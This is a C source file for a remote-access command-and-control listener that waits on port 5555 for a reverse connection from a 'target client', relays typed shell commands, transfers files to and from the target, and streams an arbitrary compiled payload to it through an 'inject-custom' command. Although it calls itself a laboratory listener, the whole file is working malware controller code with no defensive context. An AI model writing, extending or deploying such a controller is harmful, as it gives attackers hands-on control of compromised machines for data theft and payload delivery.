#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/stat.h>

#define PORT 5555
#define BUFFER_SIZE 4096

void server_send_stream(int client_fd, char *file_name) {
    FILE *f = fopen(file_name, "rb");
    if (!f) {
        send(client_fd, "[-] ERROR: File not found on server.", 35, 0);
        printf("[-] Local file '%s' does not exist.\n", file_name);
        return;
    }

    // 1. Get exact file size tracking
    struct stat st;
    stat(file_name, &st);
    long file_size = st.st_size;

    // 2. Transmit the file size heading packet first
    char size_str[32];
    sprintf(size_str, "%ld", file_size);
    send(client_fd, size_str, sizeof(size_str), 0);
    usleep(100000); // 100ms pause to ensure boundary alignment

    // 3. Stream raw data chunks safely
    char buffer[BUFFER_SIZE];
    long bytes_sent = 0;
    while (bytes_sent < file_size) {
        int read_len = fread(buffer, 1, BUFFER_SIZE, f);
        send(client_fd, buffer, read_len, 0);
        bytes_sent += read_len;
    }
    fclose(f);
    printf("[+] Successfully sent '%s' (%ld bytes) down to the client.\n", file_name, file_size);
}

void server_recv_stream(int client_fd, char *file_name) {
    char size_str[32];
    memset(size_str, 0, sizeof(size_str));
    
    // 1. Read the size descriptor heading sent by the client
    recv(client_fd, size_str, sizeof(size_str), 0);
    if (strstr(size_str, "ERROR") != NULL) {
        printf("%s\n", size_str);
        return;
    }

    long file_size = atol(size_str);
    printf("[*] Incoming upload size: %ld bytes. Writing to server drive...\n", file_size);

    // 2. Open file for raw binary writing into local workspace
    FILE *f = fopen(file_name, "wb");
    if (!f) {
        perror("[-] Failed to create file on server");
        return;
    }

    char buffer[BUFFER_SIZE];
    long bytes_received = 0;
    while (bytes_received < file_size) {
        long remaining = file_size - bytes_received;
        long chunk_to_read = (remaining < BUFFER_SIZE) ? remaining : BUFFER_SIZE;
        int read_len = recv(client_fd, buffer, chunk_to_read, 0);
        if (read_len <= 0) break;
        
        fwrite(buffer, 1, read_len, f);
        bytes_received += read_len;
    }
    fclose(f);
    printf("[+] Upload successful! '%s' generated on server path.\n", file_name);
}

int main() {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char command[BUFFER_SIZE];
    char response[BUFFER_SIZE * 2];

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("[-] Bind failed");
        exit(EXIT_FAILURE);
    }
    listen(server_fd, 5);

    printf("[+] Pure C Laboratory Listener active on port %d...\n", PORT);
    printf("[*] Awaiting dynamic reverse connection loop...\n");

    client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
    printf("[+] Target client linked successfully from: %s\n\n", inet_ntoa(address.sin_addr));

    while (1) {
        printf("* Shell~%s: ", inet_ntoa(address.sin_addr));
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = 0; // Strip trailing newline

        if (strlen(command) == 0) continue;

        // Route commands over the socket interface
        send(client_fd, command, strlen(command) + 1, 0);

        if (strcmp(command, "quit") == 0) break;
        
        else if (strcmp(command, "clear") == 0) {
            system("clear");
            continue;
        }
        else if (strncmp(command, "download ", 9) == 0) {
            server_send_stream(client_fd, command + 9);
        }
        else if (strncmp(command, "upload ", 7) == 0) {
            server_recv_stream(client_fd, command + 7);
        }
        else if (strcmp(command, "inject-custom") == 0) {
            char bin_path[BUFFER_SIZE];
            printf("\n[*] Dynamic Raw Binary Injection Active.\n");
            printf("Enter path to local payload file (e.g. payload.bin): ");
            fgets(bin_path, sizeof(bin_path), stdin);
            bin_path[strcspn(bin_path, "\r\n")] = 0;

            FILE *f_bin = fopen(bin_path, "rb");
            if (!f_bin) {
                send(client_fd, "ERROR", 5, 0);
                printf("[-] Local payload file '%s' could not be opened.\n", bin_path);
                continue;
            }

            struct stat st_bin;
            stat(bin_path, &st_bin);
            long bin_size = st_bin.st_size;

            // Send size heading packet
            char size_header[32];
            sprintf(size_header, "%ld", bin_size);
            send(client_fd, size_header, sizeof(size_header), 0);
            usleep(100000);

            // Stream raw compiled payload bytes straight over the link
            char bin_buf[BUFFER_SIZE];
            long bytes_sent_bin = 0;
            while (bytes_sent_bin < bin_size) {
                int read_len = fread(bin_buf, 1, BUFFER_SIZE, f_bin);
                send(client_fd, bin_buf, read_len, 0);
                bytes_sent_bin += read_len;
            }
            fclose(f_bin);

            // Receive address confirmation metrics
            memset(response, 0, sizeof(response));
            recv(client_fd, response, sizeof(response) - 1, 0);
            printf("%s\n", response);
        }
        else {
            // Standard commands (ls, pwd, cd) print raw output returned by client process
            memset(response, 0, sizeof(response));
            recv(client_fd, response, sizeof(response) - 1, 0);
            printf("%s\n", response);
        }
    }

    close(client_fd);
    close(server_fd);
    return 0;
}
